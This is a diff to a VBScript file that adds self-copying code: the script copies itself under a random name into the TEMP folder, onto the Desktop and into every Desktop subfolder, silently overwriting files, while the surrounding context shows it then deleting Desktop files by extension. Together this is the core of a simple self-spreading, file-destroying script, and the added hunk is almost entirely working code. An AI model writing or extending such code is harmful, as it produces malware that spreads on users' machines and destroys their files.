@@ -15,6 +15,36 @@ Set objFSO = CreateObject("Scripting.FileSystemObject")
 ' Get the Desktop folder
 Set objFolder = objFSO.GetFolder(objShell.SpecialFolders("Desktop"))
 
+' Generate a random number for the copy iteration
+Randomize
+Dim randomIteration
+randomIteration = Int((1000 * Rnd) + 1)
+
+' Copy the script to the temporary folder
+Dim strCopyPath
+strCopyPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\Copy" & randomIteration & ".vbs"
+objFSO.CopyFile WScript.ScriptFullName, strCopyPath, True ' Add "True" to overwrite existing files
+
+' Create a copy of the script on the desktop
+Dim strDesktopCopyPath
+strDesktopCopyPath = objFolder.Path & "\Copy" & randomIteration & ".vbs"
+objFSO.CopyFile strCopyPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files
+
+' Get the list of folders on the desktop
+Dim colFolders, objDesktopFolder
+Set objDesktopFolder = objFSO.GetFolder(objFolder.Path)
+Set colFolders = objDesktopFolder.SubFolders
+
+' Iterate through each folder and create a copy of the script
+Dim objSubFolder
+For Each objSubFolder In colFolders
+    Dim strFolderCopyPath
+    strFolderCopyPath = objSubFolder.Path & "\Copy" & randomIteration & ".vbs"
+    On Error Resume Next
+    objFSO.CopyFile strCopyPath, strFolderCopyPath, True ' Add "True" to overwrite existing files
+    On Error GoTo 0
+Next
+
 ' Loop through each file in the Desktop folder and delete if it has a specified file extension
 For Each objFile In objFolder.Files
     Dim extension
